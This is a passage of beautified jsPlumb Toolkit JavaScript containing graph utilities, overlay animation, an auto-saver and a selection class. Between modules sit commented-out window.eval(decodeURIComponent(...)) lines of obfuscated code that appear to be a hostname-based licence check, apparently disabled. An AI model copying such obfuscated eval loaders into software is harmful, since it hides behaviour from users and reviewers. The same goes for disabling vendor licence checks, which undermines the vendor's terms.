))()%3B")),
function() {
    "use strict";
    var a = this;
    a.jsPlumbToolkitUtil = a.jsPlumbToolkitUtil || {};
    var b = a.jsPlumbToolkitUtil
      , c = a.jsPlumbUtil;
    b.fastTrim = function(a) {
        for (var b = a.replace(/^\s\s*/, ""), c = /\s/, d = b.length; c.test(b.charAt(--d)); )
            ;
        return b.slice(0, d + 1)
    }
    ,
    b.uuid = function() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0
              , c = "x" == a ? b : 3 & b | 8;
            return c.toString(16)
        })
    }
    ,
    b.each = function(a, b) {
        a = null == a.length || "string" == typeof a ? [a] : a;
        for (var c = 0; c < a.length; c++)
            b(a[c])
    }
    ,
    b.populate = function(a, b) {
        var d = function(a) {
            var c = a.match(/(\${.*?})/g);
            if (null != c)
                for (var d = 0; d < c.length; d++) {
                    var e = b[c[d].substring(2, c[d].length - 1)];
                    e && (a = a.replace(c[d], e))
                }
            return a
        }
          , e = function(a) {
            if (null != a) {
                if (c.isString(a))
                    return d(a);
                if (c.isArray(a)) {
                    for (var b = [], f = 0; f < a.length; f++)
                        b.push(e(a[f]));
                    return b
                }
                if (c.isObject(a)) {
                    var b = {};
                    for (var f in a)
                        b[f] = e(a[f]);
                    return b
                }
                return a
            }
        };
        return e(a)
    }
    ,
    b.mergeWithParents = function(a, b, d) {
        d = d || "parent";
        var e = function(a) {
            return a ? b[a] : null
        }
          , f = function(a) {
            return a ? e(a[d]) : null
        }
          , g = function(a, b) {
            if (null == a)
                return b;
            var d = c.merge(a, b);
            return g(f(a), d)
        }
          , h = function(a) {
            if (null == a)
                return {};
            if ("string" == typeof a)
                return e(a);
            if (a.length) {
                for (var b, c = !1, d = 0; !c && d < a.length; )
                    b = h(a[d]),
                    b ? c = !0 : d++;
                return b
            }
        }
          , i = h(a);
        return i ? g(f(i), i) : {}
    }
    ,
    "undefined" != typeof exports && (exports.jsPlumbToolkitUtil = b)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = {
        nodeTraverseStart: "startNodeTraversal",
        nodeTraverseEnd: "endNodeTraversal",
        start: "startOverlayAnimation",
        end: "endOverlayAnimation"
    }
      , e = {
        nodeTraversing: "jtk-animate-node-traversing",
        edgeTraversing: "jtk-animate-edge-traversing",
        nodeTraversable: "jtk-animate-node-traversable",
        edgeTraversable: "jtk-animate-edge-traversable"
    };
    b.Connection.prototype.animateOverlay = function(a, f) {
        var g = this
          , h = new c.EventGenerator
          , i = g.getConnector().getLength();
        f = f || {};
        var j, k, l, m = c.uuid(), n = f.forwards !== !1, o = f.rate || 30, p = f.dwell || 250, q = f.speed || 100, r = i / q * 1e3, s = r / o, t = 1 / s * (n ? 1 : -1), u = f.isFinal !== !1, v = n ? 0 : 1, w = v, x = function() {
            return n ? w >= 1 : w <= 0
        }, y = n ? g.source : g.target, z = n ? g.target : g.source;
        if ("string" == typeof a)
            l = [a, {
                location: v,
                id: m
            }];
        else {
            var A = b.extend({}, a[1]);
            A.location = v,
            A.id = m,
            l = [a[0], A]
        }
        var B = function() {
            g.removeOverlay(m),
            window.clearInterval(j),
            u ? (b.addClass(z, e.nodeTraversing),
            window.setTimeout(function() {
                b.removeClass(z, e.nodeTraversing),
                g.removeClass(e.edgeTraversing),
                h.fire(d.end, g)
            }, p)) : (g.removeClass(e.edgeTraversing),
            h.fire(d.end, g))
        }
          , C = function() {
            w += t,
            x() ? B() : (k.loc = w,
            g.repaint())
        }
          , D = function() {
            h.fire(d.start, g),
            k = g.addOverlay(l),
            j = window.setInterval(C, o)
        }
          , E = function() {
            h.fire(d.nodeTraverseStart, {
                connection: g,
                element: y
            }),
            b.addClass(y, e.nodeTraversing),
            g.addClass(e.edgeTraversing),
            window.setTimeout(function() {
                b.removeClass(y, e.nodeTraversing),
                h.fire(d.nodeTraverseEnd, {
                    connection: g,
                    element: y
                }),
                D()
            }, p)
        };
        return f.previous ? f.previous.bind(d.end, E) : E(),
        h
    }
}
.call("undefined" == typeof window ? this : window),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = ["node", "port", "edge", "group"]
      , c = ["Refreshed", "Added", "Removed", "Updated", "Moved"]
      , d = ["edge"]
      , e = ["Source", "Target"]
      , f = function(a, b, c, d) {
        for (var e = 0; e < a.length; e++)
            for (var f = 0; f < b.length; f++)
                c.bind(a[e] + b[f], d)
    };
    a.jsPlumbToolkitUtil.AutoSaver = function(a, g, h, i, j, k, l) {
        function m(a) {
            return function() {
                a && a.apply(a, arguments),
                l && l()
            }
        }
        var n = !1
          , o = function() {
            if (!n) {
                try {
                    k && k()
                } catch (a) {}
                a.save({
                    url: g,
                    success: m(i),
                    error: m(j),
                    headers: h
                })
            }
        };
        a.bind("dataLoadStart", function() {
            n = !0
        }),
        a.bind("dataLoadEnd", function() {
            n = !1
        }),
        a.bind("graphClearStart", function() {
            n = !0
        }),
        a.bind("graphCleared", function() {
            n = !1
        }),
        f(b, c, a, o),
        f(d, e, a, o)
    }
    ,
    a.jsPlumbToolkitUtil.CatchAllEventHandler = function(a) {
        var g = function() {
            a.fire("dataUpdated")
        };
        f(b, c, a, g),
        f(d, e, a, g)
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this
      , b = a.jsPlumbToolkitUtil
      , c = a.jsPlumbUtil;
    b.Selection = function(a) {
        c.EventGenerator.apply(this, arguments);
        var d, e = a.toolkit, f = [], g = [], h = [], i = Math.Infinity, j = Math.Infinity, k = Math.Infinity, l = a.generator, m = {}, n = this, o = a.onClear || function() {}
        , p = function(a) {
            return "Edge" === a.objectType ? h : "Node" === a.objectType ? f : g
        }, q = function(a) {
            var c = []
              , e = p(a)
              , f = "Edge" === a.objectType ? j : "Node" === a.objectType ? i : k;
            if (e.length >= f) {
                if (d === b.Selection.DISCARD_NEW)
                    return !1;
                c = e.splice(0, 1),
                r(c[0], "Removed"),
                delete m[c[0].getFullId()]
            }
            return e.push(a),
            r(a, "Added"),
            c
        }, r = function(a, b) {
            var c = a.objectType.toLowerCase() + b
              , d = {
                Group: {
                    data: a.data,
                    group: a
                },
                Node: {
                    data: a.data,
                    node: a
                },
                Port: {
                    data: a.data,
                    node: a.node,
                    port: a
                },
                Edge: {
                    data: a.data,
                    edge: a
                }
            };
            n.fire(c, d[a.objectType])
        };
        this.getModel = e.getModel,
        this.setSuspendGraph = e.setSuspendGraph,
        this.getNodeId = e.getNodeId,
        this.getGroupId = e.getNodeId,
        this.getEdgeId = e.getEdgeId,
        this.getPortId = e.getPortId,
        this.getNodeType = e.getNodeType,
        this.getGroupType = e.getNodeType,
        this.getEdgeType = e.getEdgeType,
        this.getPortType = e.getPortType,
        this.getObjectInfo = e.getObjectInfo,
        this.isDebugEnabled = e.isDebugEnabled;
        var s = function(a, b) {
            if (!m[a.getFullId()]) {
                var c = q(a);
                return c === !1 ? [[], []] : (m[a.getFullId()] = a,
                b && b(a, !0),
                [[a], c])
            }
            return [[], []]
        }
          , t = function(a, b) {
            var d = c.removeWithFunction(p(a), function(b) {
                return b.id == a.id
            });
            return d && r(a, "Removed"),
            delete m[a.getFullId()],
            b && b(a, !1),
            [[], []]
        }
          , u = function(a, b) {
            return m[a.getFullId()] ? t(a, b) : s(a, b)
        }
          , v = function(a, b, d) {
            var f, g = [], h = [];
            if (null == a)
                return g;
            var i = function(a) {
                var j;
                if (c.isString(a))
                    j = e.getNode(a) || e.getEdge(a) || e.getGroup(a),
                    null != j && (f = b(j, d),
                    g.push.apply(g, f[0]),
                    h.push.apply(h, f[1]));
                else if (a.eachNode && a.eachEdge)
                    a.eachNode(function(a, b) {
                        i(b)
                    }),
                    a.eachEdge(function(a, b) {
                        i(b)
                    }),
                    a.eachGroup && a.eachGroup(function(a, b) {
                        i(b)
                    });
                else if (a.each)
                    a.each(function(a, b) {
                        i(b.vertex || b)
                    });
                else if (null != a.length)
                    for (var k = 0; k < a.length; k++)
                        i(a[k], d);
                else
                    f = b(a, d),
                    g.push.apply(g, f[0]),
                    h.push.apply(h, f[1])
            };
            return i(a),
            [g, h]
        }
        .bind(this);
        e.bind("nodeRemoved", function(a) {
            t(a.node)
        }),
        e.bind("groupRemoved", function(a) {
            t(a.group)
        }),
        e.bind("portRemoved", function(a) {
            t(a.port)
        }),
        e.bind("edgeRemoved", function(a) {
            t(a.edge)
        }),
        e.bind("edgeTarget", function(a) {
            m[a.edge.getFullId()] && n.fire("edgeTarget", a)
        }),
        e.bind("edgeSource", function(a) {
            m[a.edge.getFullId()] && n.fire("edgeSource", a)
        }),
        e.bind("nodeUpdated", function(a) {
            m[a.node.getFullId()] && n.fire("nodeUpdated", a)
        }),
        e.bind("groupUpdated", function(a) {
            m[a.group.getFullId()] && n.fire("groupUpdated", a)
        }),
        e.bind("edgeUpdated", function(a) {
            m[a.edge.getFullId()] && n.fire("edgeUpdated", a)
        }),
        e.bind("portUpdated", function(a) {
            m[a.port.getFullId()] && n.fire("portUpdated", a)
        }),
        this.remove = function(a, b) {
            return v(a, t, b)
        }
        ,
        this.append = function(a, b) {
            return v(a, s, b)
        }
        ,
        this.toggle = function(a, b) {
            return v(a, u, b)
        }
        ,
        this.setMaxNodes = function(a) {
            i = a
        }
        ,
        this.setMaxEdges = function(a) {
            j = a
        }
        ,
        this.setCapacityPolicy = function(a) {
            d = a
        }
        ,
        this.clear = function(a) {
            f.length = 0,
            h.length = 0,
            g.length = 0,
            m = {},
            a || o(this)
        }
        ,
        this.reload = function() {
            if (null != l) {
                this.clear();
                var a;
                for (this.fire("dataLoadStart"),
                l(this, e),
                a = 0; a < g.length; a++)
                    n.fire("groupAdded", g[a]);
                for (a = 0; a < f.length; a++)
                    n.fire("nodeAdded", f[a]);
                for (a = 0; a < h.length; a++)
                    n.fire("edgeAdded", h[a]);
                this.fire("dataLoadEnd")
            }
        }
        ,
        this.each = function(a, b) {
            for (var d = "Edge" === b ? h : "Group" === b ? g : f, e = 0; e < d.length; e++)
                try {
                    a(e, d[e])
                } catch (a) {
                    c.log("Selection iterator function failed", a)
                }
        }
        ,
        this.eachNode = this.each,
        this.eachGroup = function(a) {
            this.each(a, "Group")
        }
        ,
        this.eachNodeOrGroup = function(a) {
            this.each(a, "Node"),
            this.each(a, "Group")
        }
        ,
        this.eachEdge = function(a) {
            this.each(a, "Edge")
        }
        ,
        this.getNodeCount = function() {
            return f.length
        }
        ,
        this.getNodeAt = function(a) {
            return f[a]
        }
        ,
        this.getNodes = function() {
            return f
        }
        ,
        this.getNode = e.getNode,
        this.getGroupAt = function(a) {
            return g[a]
        }
        ,
        this.getGroups = function() {
            return g
        }
        ,
        this.getGroup = e.getGroup,
        this.getGroupCount = function() {
            return g.length
        }
        ,
        this.getAll = function() {
            var a = [];
            return Array.prototype.push.apply(a, f),
            Array.prototype.push.apply(a, h),
            Array.prototype.push.apply(a, g),
            a
        }
        ,
        this.getAllEdgesFor = function(a) {
            for (var b = a.getAllEdges(), c = [], d = 0; d < b.length; d++)
                null != m[b[d].getId()] && c.push(b[d]);
            return c
        }
        ,
        this.getEdgeCount = function() {
            return h.length
        }
        ,
        this.get = this.getNodeAt = function(a) {
            return f[a]
        }
        ,
        this.getEdge = this.getEdgeAt = function(a) {
            return h[a]
        }
        ,
        this.setCapacityPolicy(b.Selection.DISCARD_EXISTING)
    }
    ,
